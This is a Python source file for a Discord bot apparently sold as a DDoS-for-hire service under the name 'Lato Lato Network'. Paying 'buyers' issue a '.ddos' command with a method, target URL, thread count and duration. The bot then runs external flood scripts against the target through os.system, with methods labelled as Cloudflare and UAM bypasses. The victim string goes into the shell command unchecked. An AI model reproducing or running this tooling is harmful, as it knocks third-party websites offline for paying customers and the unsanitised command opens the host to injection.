import os
try:
	import discord
except ImportError:
	os.system("pip3 install discord")
try:
	import colorama
	import requests
except ImportError:
	os.system("pip install colorama")
from discord.ext import commands    
from discord.ext.commands import Bot 
from os import system        
from os import name                  
from colorama import *                                                
import random, datetime, discord                        
#=====User && Methods Setting=====#
buyers  = [1037429234353852467]  #          
admins  = [1037429234353852467]  #   ID users            
owners  = [1037429234353852467]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW','TLS','BYPASS'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = '' # paste your token here
intents = discord.Intents.default()
intents.members = True 
intents.message_content = True
intents.messages = True
intents.dm_messages = True       
bot = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")    
#=====Random Color=====#
async def random_color():
    number_lol = random.randint(1, 999999)
    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
    return number_lol
#=====Bot Command=====#
@bot.command(name="samp")
async def samp(ctx, *,args=None):
        if args is None:
          await ctx.send("""
        ```
Usage !samp <ip>:<port>
example !samp 192.168.1.1:7777
        ```
        """)
        else:
          splits = args.split(":")
          ip = str(splits[0])
          port = int(splits[1])
          r = requests.get(f"https://tokyosamp.cyclic.app/API/samp?ip={ip}&port={port}")
          if "Something Went Wrong Please Check ip And port correcly or Please Try Again Later" in r.text:
            await ctx.send(f"Unable to connect to {ip}:{port}")
          else:
            res = r.json()
            samp = res['response']
            rule = samp['rule']
            embed = discord.Embed(title="",color=0x00000,timestamp=ctx.message.created_at)
            embed.set_author(name=samp['hostname'].upper())
            embed.add_field(name="Gamemode",value=f"{samp['gamemode']}")
            embed.add_field(name="Language",value=f"{samp['language']}")
            embed.add_field(name="Password",value=f"{samp['passworded']}")
            embed.add_field(name="PlayersOnline",value=f"{samp['isPlayerOnline']}/{samp['maxplayers']}")
            embed.add_field(name="Mapname",value=f"{rule['mapname']}")
            embed.add_field(name="Lagcomp",value=f"{rule['lagcomp']}")
            embed.add_field(name="Weather",value=f"{rule['weather']}")
            embed.add_field(name="Worldtime",value=f"{rule['worldtime']}")
            embed.add_field(name="Weburl",value=f"[{rule['weburl']}](http://{rule['weburl']})")
            embed.add_field(name="Version",value=f"{rule['version']}")
            embed.add_field(name="Only Show 10 Players Online!",value=f"""
            ```
[ID]   Name      Score Ping
---------------------------
{samp['isPlayersIngame']}\n
            ```
            """)
            embed.set_thumbnail(url="https://i.postimg.cc/P5d2CCv7/samp-logo-png-6.png")
            await ctx.send(embed=embed)
#=====Samp Cmd=====#
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="Lato Lato Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**All Methods**", value = f"```yaml\nHTTP-FLOOD\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKET\nCLOUDFLARE\nUAM-BYPASS\nSLOW\nBYPASS```")
        embed.add_field(name = "**Syntax**", value = "```md\n.ddos <method> <url> <thread> <time>md\n.samp <ip>:<port>```")
        embed.add_field(name = "**NOTE**", value = "> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Lato Lato Network.")
        embed.set_footer(text = f"©{year_now} SlibawKarss")
        await ctx.send(embed=embed)
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer in buyers:
        await ctx.send(f'{buyer} has already copped a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.append(buyer)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer not in buyers:
        await ctx.send(f'{buyer} did not cop a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.remove(buyer)
        await ctx.send('Removed him/her!!')
        
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin in admins:
        await ctx.send(f'{admin} is already an admin!')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.append(admin)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin not in admins:
        await ctx.send(f'{admin} is not an admin')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.remove(admin)
        await ctx.send('Removed him/her!!')

@bot.command()
async def ddos(ctx, method : str = None, victim : str = None, thread : str = None, time : str = None):
    if ctx.author.id not in buyers: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if method is None:
            embed = discord.Embed(title=f"Error!", description=f"You need a method! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif method.upper() not in methods:
            embed = discord.Embed(title="Error!", description=f"Invalid method!! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif thread is None:
            embed = discord.Embed(title="Error!", description=f"You need a thread! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(300)
                max_thread = int(50000)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                if int(thread) > max_thread:
                    thread2 = max_thread
                else:
                    thread2 = int(thread)
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpgf")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'go run httpflood.go {victim} {thread2} get {time2} nil')
                elif method == 'HTTP-RAW':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpg")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'node HTTP-RAW.js {victim} {time2}')
                elif method == 'HTTP-RAND':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpg")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'node HTTP-RAND.js {victim} {time2}')
                elif method == 'HTTP-SOCKET':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpg")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'node HTTP-SOCKET.js {victim} 7000 {time2}')
                elif method == 'TLS':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpg")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'node tls.js GET {victim} {time2} 120')
                elif method == 'CLOUDFLARE':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpg")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'node cf.js {victim} {time2} {thread2}')
                elif method == 'UAM-BYPASS':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpg")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'node uambypass.js {victim} {time2} 2000 proxies.txt')
                elif method == 'SLOW':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpg")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'node slow.js {victim} {time2}')
                elif method == 'BYPASS':
                    embed = discord.Embed(title=f"Lato Lato Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1102467134312955960/1102921912117645352/images.jpg")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} SlibawKarss")
                    await ctx.send(embed=embed)
                    system(f'node layer7.js {victim} {time2}')

           

@bot.event
async def on_ready():
    banner = f"""
           \033[1;36m  ╦  ╔═╗╔╦╗╔═╗  ╦  ╔═╗╔╦╗╔═╗
            \033[1;35m ║  ╠═╣ ║ ║ ║  ║  ╠═╣ ║ ║ ║
            \033[1;34m ╩═╝╩ ╩ ╩ ╚═╝  ╩═╝╩ ╩ ╩ ╚═╝
             LATO-LATO NETWORK V3 WAIT FOR THE UPDATE
\033[1;97m=============================================================
    """
    if name == 'nt':
        system('cls')
    else:
        system('clear')
    print(banner)
    print(f'\033[1;97mLogged \033[1;96m{bot.user.name}')
    print(f'\033[1;97mBot ID: \033[1;97m{bot.user.id}')
    print('\033[1;97m=============================================================')
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))
if __name__ == '__main__':
    init(convert=True)
    bot.run(token)
